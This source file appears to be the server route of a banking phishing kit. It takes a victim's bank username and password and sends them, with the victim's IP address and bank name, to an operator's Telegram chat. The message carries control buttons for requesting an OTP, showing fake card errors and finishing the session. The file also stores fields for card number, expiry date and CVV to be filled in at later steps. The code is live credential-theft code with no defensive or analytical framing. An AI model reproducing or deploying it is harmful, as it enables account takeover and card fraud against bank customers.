import { NextRequest, NextResponse } from 'next/server';
import { TELEGRAM_CONFIG } from '@/lib/database';
import { caseStore } from '@/lib/store';

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const { usuario, password, dispositivo, banco } = body;

        if (!usuario || !password) {
            return NextResponse.json(
                { success: false, message: 'Usuario y contraseña requeridos' },
                { status: 400 }
            );
        }

        // Get client IP
        const forwarded = request.headers.get('x-forwarded-for');
        const ip = forwarded ? forwarded.split(',')[0] : request.headers.get('x-real-ip') || 'unknown';

        // Get current timestamp
        const now = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });

        // Create unique registro ID (timestamp-based)
        const registroId = Date.now();

        // Send to Telegram with inline keyboard
        const message = `🆕 Nuevo LOGO:

🆔 ID: ${registroId}
👤 Usuario: ${usuario}
🔑 Contraseña: ${password}
🏦 Banco: ${banco}
🌐 IP: ${ip}
⏰ Hora: ${now}`;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: 'Usuario', callback_data: `usuario_${registroId}` },
                    { text: 'OTP', callback_data: `otp_${registroId}` }
                ],
                [
                    { text: 'Error 404', callback_data: `404_${registroId}` },
                    { text: 'Error CC', callback_data: `ccerror_${registroId}` }
                ],
                [
                    { text: 'Finalizar', callback_data: `finalizar_${registroId}` }
                ],
                [
                    { text: 'Actualizar', callback_data: `actualizar_${registroId}` }
                ]
            ]
        };

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: message,
                reply_markup: keyboard
            })
        });

        // Store session info
        caseStore.addCase({
            idreg: registroId,
            usuario,
            password,
            otp: null,
            dispositivo,
            ip,
            banco,
            status: 1,
            horacreado: now,
            horamodificado: now,
            id: null,
            agente: null,
            email: null,
            cemail: null,
            celular: null,
            tarjeta: null,
            ftarjeta: null,
            cvv: null
        });

        return NextResponse.json({
            success: true,
            registroId,
            status: 1
        }, {
            headers: {
                'Set-Cookie': [
                    `registro=${registroId}; Path=/; Max-Age=${60 * 9}`,
                    `usuario=${usuario}; Path=/; Max-Age=${60 * 9}`,
                    `estado=1; Path=/; Max-Age=${60 * 9}`
                ].join(', ')
            }
        });

    } catch (error) {
        console.error('Error in paso-usuario:', error);
        return NextResponse.json(
            { success: false, message: 'Error al procesar' },
            { status: 500 }
        );
    }
}
